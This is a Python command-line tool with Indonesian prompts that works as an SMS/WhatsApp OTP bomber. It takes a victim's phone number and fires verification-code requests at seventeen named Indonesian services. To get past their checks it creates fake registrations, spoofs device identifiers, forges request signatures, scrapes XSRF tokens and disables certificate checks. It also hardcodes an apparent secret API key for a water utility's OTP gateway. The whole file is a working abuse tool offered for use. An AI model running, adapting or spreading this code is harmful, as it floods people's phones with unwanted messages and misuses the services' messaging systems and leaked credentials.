import requests
import json
import time
import random
import re
import hashlib
import sys
import logging
import urllib.request
import urllib.error
import urllib.parse
import hmac
import uuid
import base64
import ssl
from datetime import datetime
from typing import Tuple
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

class BaseTarget:
    def __init__(self, phone: str):
        self.phone = phone
        self.session = requests.Session()
        self.session.verify = False
        self.user_agent = self._get_ua()
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        })

    def _get_ua(self) -> str:
        return "Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"

    def _validate_response(self, text: str) -> Tuple[bool, str]:
        if not text or not text.strip(): return False, "Empty response"
        text_lower = text.lower().strip()
        
        if text_lower.startswith("<!doctype") or text_lower.startswith("<html"): return False, "HTML/WAF Block"
        
        hard_fails = ["codesent\":false", "invalid number", "rate limit", "too many requests", "blocked", "unauthorized", "already registered", "subscription kamu sudah expired", "pendaftaran sedang ditutup", "jumlah permintaan kode otp hari ini telah melebihi batas", "versi aplikasi saat ini terlalu rendah"]
        for fail in hard_fails:
            if fail in text_lower: return False, f"Rejection: '{fail}'"
            
        success_indicators = ["messageissent\":true", "berhasil dikirim", "code sent", "otp sent", "successfully sent", "verifikasi", "success"]
        for ind in success_indicators:
            if ind in text_lower: return True, f"Explicit: '{ind}'"
            
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                if data.get("success") is True or str(data.get("status")).lower() in ("true", "success", "200", "0") or str(data.get("code")) in ("200", "0"): return True, "Clean JSON"
                if "response" in data and isinstance(data["response"], dict) and "requestId" in data["response"]: return True, "Rumah123 Pattern"
                if "data" in data and isinstance(data["data"], dict) and "credential" in data["data"]: return True, "Optik Melawai Credential Extracted"
        except: pass
        
        return False, f"Unknown Raw: '{text[:50]}'"

    def send(self) -> Tuple[bool, str]: raise NotImplementedError

class Target1_Rumah123(BaseTarget):
    def send(self):
        try:
            res = self.session.post("https://www.rumah123.com/api/otp/request-otp", json={"cancelledRequestId": "", "phoneNumber": f"62{self.phone}", "portalId": 1, "type": "WHATSAPP"}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target2_Doran(BaseTarget):
    def send(self):
        try:
            nama = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=5))
            email = f"{nama.lower()}{random.randint(100, 999)}@gmail.com"
            self.session.post("https://kasir.doran.id/api/register", data={"phone": self.phone, "phonecode": "+62", "email": email, "name": nama}, timeout=10)
            res = self.session.post("https://kasir.doran.id/api/auth/otp", json={"phone": f"0{self.phone}", "web_otp": 1, "send_wa": 1}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target3_Maulagi(BaseTarget):
    def send(self):
        try:
            sec = time.strftime("%S"); sec_num = int(sec)
            prefix = random.choice(["B", "E"] if sec_num % 2 == 0 else ["A", "C", "D"])
            xml_key = f"{prefix}{sec}{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=5))}{sec_num}"
            res = self.session.post("https://api.maulagi.id/api/v2/auth/check", json={"credentials": f"0{self.phone}"}, headers={"x-ml-key": xml_key}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target4_Adiraku(BaseTarget):
    def send(self):
        try:
            res = self.session.post("https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", json={"mobileNumber": f"0{self.phone}", "type": "prospect-create", "channel": "whatsapp"}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target5_Singa(BaseTarget):
    def send(self):
        try:
            res = self.session.post("https://api102.singa.id/new/login/sendWaOtp?versionName=2.5.0", json={"mobile_phone": f"0{self.phone}", "type": "mobile", "is_switchable": 1}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target6_Matahari(BaseTarget):
    def send(self):
        try:
            username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
            email = f"{username}{random.randint(100, 999)}@gmail.com"
            password = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#', k=10))
            birth_date = f"{random.randint(1990, 2005)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
            res = self.session.post("https://matahari-backend-prod.matahari.com/api/auth/register", json={"emailAddress": email, "name": username.capitalize(), "mobileNumber": f"0{self.phone}", "birthDate": birth_date, "password": password}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target7_KreditPintar(BaseTarget):
    def send(self):
        try:
            device_id = f"ll{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=15))}"
            res = self.session.post("https://app.kreditpintar.com/api/auth/send-code?lang=id", json={"mobileNumber": f"0{self.phone}", "otpType": "REGISTER", "type": "SMS"}, headers={"X-Adv-Bm": device_id, "X-Os-Type": "ANDROID"}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target8_KreditPintarEr2re(BaseTarget):
    def send(self):
        try:
            res1 = self.session.post("https://app.kreditpintar.com/api/auth/send-code?lang=id", json={"mobileNumber": f"0{self.phone}", "otpType": "REGISTER", "type": "SMS"}, timeout=10)
            try: self.session.post("https://er2re.com/dqcoz/nrfm/xwdbmmvf", json={"b": f"{random.randint(10000000, 99999999)}", "uat": self.phone, "z": "62"}, timeout=5)
            except: pass
            return self._validate_response(res1.text)
        except Exception as e: return False, str(e)

class Target9_BonusBelanja(BaseTarget):
    def send(self):
        try:
            nama = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))
            self.session.get("https://www.bonusbelanja.com/register/", timeout=10)
            res = self.session.post("https://www.bonusbelanja.com/api/auth/registration/app", json={"phone": f"62{self.phone}", "name": nama, "agreeTnc": True, "agreeContact": True}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target10_Sayurbox(BaseTarget):
    def send(self):
        try:
            res = self.session.post("https://api.cashenable.com/authentication/v2/coreauth", json={"identifier": f"62{self.phone}", "auth_method": "whatsapp"}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target11_PinjamDuit(BaseTarget):
    def send(self):
        try:
            device_id = random.randint(10000000, 99999999)
            url = f"https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=9.9.9&deviceId={device_id}&hardwareid={device_id}&deviceName=SM-S928B&osVersion=14&appName=PinjamDuit&appMarket=google_play"
            res = self.session.post(url, data={"phone": f"0{self.phone}", "sms_useage": 0, "sms_service": 2, "from": 0}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target12_Samir(BaseTarget):
    def send(self):
        try:
            self.session.get("https://domain-loansapp.samir.co.id/api/customer/check", timeout=5)
            timestamp = str(int(time.time() * 1000))
            payload = {'captchaType': 'TEXT', 'clientId': '850792dc-e673-4131-8d0f-b0a70b2772be', 'mobile': f'62{self.phone}', 'type': '2', 'androidIos': '2', 'appName': 'Samir', 'appPackage': 'com.sahabatmikro', 'channel': 'google-play', 'language': 'id_ID', 'osVersion': 'Android14', 'timestamp': timestamp, 'version': '3.0.0'}
            data_str = json.dumps(payload, separators=(',', ':'))
            payload['sign'] = hashlib.md5(data_str.encode('utf-8')).hexdigest()
            res = self.session.post("https://domain-loansapp.samir.co.id/api/customer/sendSmsCode", json=payload, headers={"Language": "id_ID"}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target13_Ukuindo(BaseTarget):
    def send(self):
        try:
            imei = ''.join(random.choices('0123456789abcdef', k=32))
            res = self.session.post("https://gateway.ukuindo.com/entrance/v3/getcode", json={"phone": f"0{self.phone}", "smsType": "SMS", "channel": "GooglePlay", "appInstanceId": ""}, headers={"Imei": imei, "Device": "ANDROID"}, timeout=10)
            return self._validate_response(res.text)
        except Exception as e: return False, str(e)

class Target14_OptikMelawai(BaseTarget):
    def send(self):
        try:
            payload = {
                "value": f"62{self.phone}",
                "action": "register",
                "lang": "id"
            }
            custom_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "User-Agent": "XoS-Architect/2.5 (Security-Research)"
            }
            logging.info(f"Menyuntikkan payload OTP terstruktur Optik Melawai untuk: 62{self.phone}")
            res = self.session.post(
                "https://api.optikmelawai.com/api/v2/auth/register/verify/phone/request", 
                json=payload, 
                headers=custom_headers, 
                timeout=(5.0, 10.0)
            )
            return self._validate_response(res.text)
        except requests.exceptions.Timeout:
            logging.error("Siklus waktu tunggu (timeout) terlampaui. Koneksi ke server Optik Melawai terputus.")
            return False, "Timeout Exception"
        except requests.exceptions.RequestException as req_err:
            logging.error(f"Anomali jaringan atau resolusi DNS gagal pada Optik Melawai: {req_err}")
            return False, str(req_err)
        except Exception as e:
            return False, str(e)

class Target15_PerumdamTirtaSiak(BaseTarget):
    def send(self):
        try:
            phone = f"+62{self.phone}"
            id_pt = 1
            app_name = "J4n9anlUp4MAk4n"
            api_key = "eWL7UYK54YkNYxtC9nTQRYQV4qVqpv"
            
            message = (
                "*Kode OTP*\n\n"
                "Kode OTP masuk Anda : ??? (berlaku 5 Menit )\n"
                "Jangan memberikan kode OTP ke pihak lain, karena bersifat rahasia\n"
                "Jika anda tidak melakukan aktifitas masuk ke Aplikasi *Perumdam Tirta Siak*\n"
                "Abaikan Kode OTP ini.\n\n"
                "Terimakasih telah menggunakan Aplikasi *Perumdam Tirta Siak*"
            )
            
            data_dict = {
                "telp": phone,
                "id_pt": id_pt,
                "message": message,
            }
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            request_id = str(uuid.uuid4())
            data_json = json.dumps(data_dict, separators=(',', ':'))
            sha256_hash = hashlib.sha256(data_json.encode()).hexdigest().lower()
            sign_string = f"{app_name}:{sha256_hash}:{timestamp}:{request_id}"
            
            sig_bytes = hmac.new(api_key.encode(), sign_string.encode(), hashlib.sha256).digest()
            signature = base64.b64encode(sig_bytes).decode()
            
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "X-Timestamp": timestamp,
                "X-Signature": signature,
                "Requestid": request_id,
                "User-Agent": "OTPTester/1.0"
            }
            
            body = json.dumps(data_dict).encode()
            url = "https://apiwa.tirtasiakpekanbaru.co.id/siak/generateotp"
            
            req = urllib.request.Request(url, data=body, headers=headers, method="POST")
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            try:
                resp = urllib.request.urlopen(req, timeout=15, context=ctx)
                text = resp.read().decode(errors="replace")
            except urllib.error.HTTPError as e:
                text = e.read().decode(errors="replace")
            except Exception as e:
                return False, f"Network Error: {str(e)}"
                
            text_lower = text.lower().strip()
            if not text: return False, "Empty response"
            if text_lower.startswith("<!doctype") or text_lower.startswith("<html"): return False, "HTML/WAF Block"
            
            hard_fails = ["invalid", "rate limit", "blocked", "unauthorized", "failed", "error", "expired"]
            for fail in hard_fails:
                if fail in text_lower: return False, f"Rejection: '{fail}'"
                
            success_indicators = ["success", "berhasil", "terkirim", "sent", "otp"]
            for ind in success_indicators:
                if ind in text_lower: return True, f"Explicit: '{ind}'"
                
            try:
                data = json.loads(text)
                if isinstance(data, dict):
                    if data.get("success") is True or str(data.get("status")).lower() in ("true", "success", "200", "0") or str(data.get("code")) in ("200", "0"): 
                        return True, "Clean JSON"
            except: pass
            
            return False, f"Unknown Raw: '{text[:50]}'"

        except Exception as e:
            return False, str(e)

class Target16_Metaproperty(BaseTarget):
    def send(self):
        try:
            base_url = "https://metaproperty.co.id"
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            cj = urllib.request.HTTPCookieProcessor()
            opener = urllib.request.build_opener(cj)
            req_init = urllib.request.Request(f"{base_url}/register", headers={"User-Agent": "OTPTester/1.0"})
            opener.open(req_init, timeout=15, context=ctx)
            
            xsrf = ""
            for c in cj.cookiejar:
                if c.name == "XSRF-TOKEN":
                    xsrf = urllib.parse.unquote(c.value)
                    
            if not xsrf:
                return False, "XSRF-TOKEN extraction failed"
                
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "User-Agent": "OTPTester/1.0",
                "X-Xsrf-Token": xsrf,
                "X-Device-Fingerprint": str(uuid.uuid4()),
            }
            
            payload = {
                "name": "Test User",
                "whatsapp": f"62{self.phone}",
                "source": "register",
            }
            
            body = json.dumps(payload).encode()
            req_otp = urllib.request.Request(
                f"{base_url}/api/v1/guest-contact/otp/request",
                data=body, headers=headers, method="POST"
            )
            
            try:
                resp = opener.open(req_otp, timeout=15, context=ctx)
                text = resp.read().decode(errors="replace")
            except urllib.error.HTTPError as e:
                text = e.read().decode(errors="replace")
            except Exception as e:
                return False, f"Network Error: {str(e)}"
                
            text_lower = text.lower().strip()
            if not text: return False, "Empty response"
            if text_lower.startswith("<!doctype") or text_lower.startswith("<html"): return False, "HTML/WAF Block"
            
            try:
                data = json.loads(text)
                if isinstance(data, dict):
                    if data.get("success") is True:
                        if "data" in data and "otp_session_id" in data["data"]:
                            return True, f"Explicit: OTP Session ID {data['data']['otp_session_id']} generated"
                        return True, "Clean JSON Success"
                    if data.get("message") and "limit" in str(data.get("message")).lower():
                        return False, "Rate Limit Reached"
            except json.JSONDecodeError:
                pass
                
            return False, f"Unknown Raw: '{text[:50]}'"

        except Exception as e:
            return False, str(e)

class Target17_NusaPay(BaseTarget):
    def send(self):
        try:
            base_url = "https://merchant.nusapay.co.id"
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            cj = urllib.request.HTTPCookieProcessor()
            opener = urllib.request.build_opener(cj)
            req_init = urllib.request.Request(f"{base_url}/register", headers={"User-Agent": "OTPTester/1.0"})
            opener.open(req_init, timeout=15, context=ctx)
            
            xsrf = ""
            for c in cj.cookiejar:
                if c.name == "XSRF-TOKEN":
                    xsrf = urllib.parse.unquote(c.value)
                    
            if not xsrf:
                return False, "XSRF-TOKEN extraction failed"
                
            headers = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "User-Agent": "OTPTester/1.0",
                "X-XSRF-TOKEN": xsrf,
                "X-Requested-With": "XMLHttpRequest",
            }
            
            biz_name = "Test Bisnis"
            data_str = f"owner_phone={self.phone}&business_name={urllib.parse.quote(biz_name)}"
            body = data_str.encode()
            
            req_otp = urllib.request.Request(
                f"{base_url}/register/phone-otp",
                data=body, headers=headers, method="POST"
            )
            
            try:
                resp = opener.open(req_otp, timeout=15, context=ctx)
                text = resp.read().decode(errors="replace")
            except urllib.error.HTTPError as e:
                text = e.read().decode(errors="replace")
            except Exception as e:
                return False, f"Network Error: {str(e)}"
                
            text_lower = text.lower().strip()
            if not text: return False, "Empty response"
            if text_lower.startswith("<!doctype") or text_lower.startswith("<html"): return False, "HTML/WAF Block"
            
            hard_fails = ["batas maximum", "rate limit", "too many requests", "blocked", "gagal", "error", "invalid"]
            for fail in hard_fails:
                if fail in text_lower: return False, f"Rejection: '{fail}'"
                
            success_indicators = ["berhasil", "success", "terkirim", "sent", "otp terkirim", "kode otp"]
            for ind in success_indicators:
                if ind in text_lower: return True, f"Explicit: '{ind}'"
                
            try:
                data = json.loads(text)
                if isinstance(data, dict):
                    if data.get("success") is True or data.get("status") == True:
                        return True, "Clean JSON Success"
                    if "message" in data and "batas" in str(data["message"]).lower():
                        return False, "Rate Limit Reached"
            except json.JSONDecodeError:
                pass
                
            return False, f"Unknown Raw: '{text[:50]}'"

        except Exception as e:
            return False, str(e)

class VerifiedFinalCLI:
    TARGETS = {
        "1": ("rumah123.com", "WhatsApp", Target1_Rumah123),
        "2": ("doran.id", "SMS", Target2_Doran),
        "3": ("maulagi.id", "WhatsApp", Target3_Maulagi),
        "4": ("adiraku.co.id", "WhatsApp", Target4_Adiraku),
        "5": ("singa.id", "WhatsApp", Target5_Singa),
        "6": ("matahari.com", "OTP", Target6_Matahari),
        "7": ("kreditpintar.com", "WhatsApp", Target7_KreditPintar),
        "8": ("kreditpintar+er2re", "WhatsApp", Target8_KreditPintarEr2re),
        "9": ("bonusbelanja.com", "WhatsApp", Target9_BonusBelanja),
        "10": ("sayurbox (Labamu)", "WhatsApp", Target10_Sayurbox),
        "11": ("pinjamduit.co.id", "SMS/WA", Target11_PinjamDuit),
        "12": ("samir.co.id", "SMS/WA", Target12_Samir),
        "13": ("ukuindo.com", "SMS", Target13_Ukuindo),
        "14": ("optikmelawai.com", "WhatsApp/SMS", Target14_OptikMelawai),
        "15": ("tirtasiakpekanbaru.co.id", "WhatsApp", Target15_PerumdamTirtaSiak),
        "16": ("metaproperty.co.id", "WhatsApp", Target16_Metaproperty),
        "17": ("nusapay.co.id", "WhatsApp", Target17_NusaPay),
    }

    def __init__(self):
        self.phone = None
        self.selected_targets = []

    def _normalize_phone(self, raw: str) -> str:
        cleaned = re.sub(r'[^\d]', '', raw)
        if cleaned.startswith('62'): cleaned = cleaned[2:]
        elif cleaned.startswith('0'): cleaned = cleaned[1:]
        return cleaned

    def get_phone(self) -> bool:
        print("\n" + "=" * 74)
        print("  VERIFIED FINAL v8.0: 17-NODE BULLETPROOF DELIVERY TOOL")
        print("  True Positive + Phoenix + Multi-Gateway + Melawai + Tirta Siak + Metaproperty + NusaPay XSRF")
        print("=" * 74)
        while True:
            raw = input("\n[?] Masukkan nomor target (08xx/8xx/+62): ").strip()
            if not raw: continue
            phone = self._normalize_phone(raw)
            if not phone.isdigit() or not (9 <= len(phone) <= 12):
                print("  [!] Format tidak valid."); continue
            print(f"  [✓] Lock Target: +62{phone}")
            self.phone = phone
            return True

    def select_targets(self):
        print("\nPilih target (koma untuk banyak, atau 'all' untuk semua):")
        print("  " + "-" * 60)
        for key, (name, channel, _) in self.TARGETS.items():
            print(f"    [{key:>2}] {name:<28} ({channel})")
        print("  " + "-" * 60)
        while True:
            choice = input("\n[>] Pilihan: ").strip().lower()
            if choice == "all":
                self.selected_targets = list(self.TARGETS.keys())
                return
            choices = [c.strip() for c in choice.split(",")]
            if all(c in self.TARGETS for c in choices) and choices:
                self.selected_targets = choices; return
            print("  [!] Pilihan tidak valid.")

    def run_test(self):
        if not self.get_phone(): return
        self.select_targets()
        print(f"\n[*] Target    : +62{self.phone}")
        print(f"  [*] Endpoint  : {len(self.selected_targets)} node")
        print(f"  [*] Eksekusi dimulai...\n")
        
        success_count = 0
        fail_count = 0
        results = []

        for target_key in self.selected_targets:
            name, channel, target_class = self.TARGETS[target_key]
            print(f"  [{target_key:>2}] {name} ({channel})")
            try:
                instance = target_class(self.phone)
                is_success, reason = instance.send()
                if is_success:
                    print(f"      [✓] BERHASIL — {reason}")
                    success_count += 1
                else:
                    print(f"      [✗] GAGAL — {reason}")
                    fail_count += 1
                results.append((target_key, name, channel, is_success, reason))
            except Exception as e:
                print(f"      [!] ERROR — {str(e)[:100]}")
                fail_count += 1
                results.append((target_key, name, channel, False, str(e)))
            
            time.sleep(random.uniform(1.5, 3.0))

        print("\n" + "=" * 74)
        print("  LAPORAN HASIL EKSEKUSI")
        print("=" * 74)
        print(f"  Total endpoint : {len(self.selected_targets)}")
        print(f"  Berhasil (API) : {success_count}")
        print(f"  Gagal / Ditolak: {fail_count}")
        
        if success_count > 0:
            print(f"\n--- Yang BERHASIL (API Layer 7) ---")
            for key, name, channel, ok, reason in results:
                if ok: print(f"    [{key:>2}] {name:<28} ({channel}) → {reason}")

        print("\n" + "=" * 74)
        print("  Selesai. Verifikasi fisik di handset tetap diperlukan.")
        print("=" * 74 + "\n")

def main():
    try:
        cli = VerifiedFinalCLI()
        cli.run_test()
    except KeyboardInterrupt:
        print("\n[!] Dibatalkan oleh pengguna.")
        sys.exit(0)

if __name__ == "__main__":
    main()